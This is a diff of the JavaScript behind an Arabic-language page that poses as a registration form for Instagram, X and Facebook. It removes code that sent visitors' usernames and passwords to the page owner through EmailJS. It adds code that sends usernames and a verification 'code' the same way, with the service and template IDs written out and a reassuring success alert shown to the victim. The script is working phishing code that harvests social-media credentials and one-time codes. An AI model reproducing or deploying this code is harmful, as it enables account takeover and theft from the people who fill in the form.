@@ -1,56 +1,28 @@
-// Initialize EmailJS with the provided public key
-document.addEventListener("DOMContentLoaded", () => {
-    emailjs.init("1xqwBMfecM1SSulsh"); // Public Key
-});
+// Initialize EmailJS
+emailjs.init("1xqwBMfecM1SSulsh");
 
-// Language toggling function
-function toggleLanguage(lang) {
-    const elements = document.querySelectorAll("[data-ar], [data-en]");
-    elements.forEach(el => {
-        el.textContent = lang === 'ar' ? el.getAttribute('data-ar') : el.getAttribute('data-en');
-    });
-    document.documentElement.lang = lang;
-}
-
-// Show form based on selected platform
 function showForm(platform) {
-    const formContainer = document.getElementById("form-container");
-    const platformName = document.getElementById("platform-name");
-    
-    // Set the platform name in the form header
-    platformName.textContent = platform === 'instagram' ? 'التسجيل في إنستغرام' : 
-                               platform === 'x' ? 'التسجيل في إكس' : 
-                               'التسجيل في فيسبوك';
-    
-    // Display the form container
-    formContainer.style.display = 'block';
-    
-    // Store the selected platform for later use
-    formContainer.setAttribute('data-platform', platform);
-}
+    // Show the form when a platform is selected
+    document.getElementById('platform-form').style.display = 'block';
+    document.getElementById('user-form').onsubmit = function (event) {
+        event.preventDefault();
 
-// Handle form submission
-document.getElementById("registration-form").addEventListener("submit", (event) => {
-    event.preventDefault();
+        const username = document.getElementById('username').value;
+        const code = document.getElementById('code').value;
 
-    const platform = document.getElementById('form-container').getAttribute('data-platform');
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
+        const message = {
+            platform: platform,
+            username: username,
+            code: code
+        };
 
-    const templateParams = {
-        platform: platform,
-        username: username,
-        password: password
+        // Send the form data via EmailJS
+        emailjs.send("service_ir3vg5y", "template_jw2qkzr", message)
+            .then(function (response) {
+                alert("تم إرسال البيانات بنجاح!");
+            }, function (error) {
+                alert("فشل في إرسال البيانات. حاول مرة أخرى.");
+                console.error(error);  // إضافه لتوضيح الخطأ
+            });
     };
-
-    emailjs.send('service_ir3vg5y', 'template_jw2qkzr', templateParams)
-        .then(() => {
-            alert('تم إرسال البيانات بنجاح!');
-            document.getElementById('registration-form').reset();
-            document.getElementById('form-container').style.display = 'none';
-        })
-        .catch(error => {
-            console.error('خطأ أثناء إرسال البيانات:', error);
-            alert('عذرًا، حدث خطأ أثناء إرسال البيانات.');
-        });
-});
+}
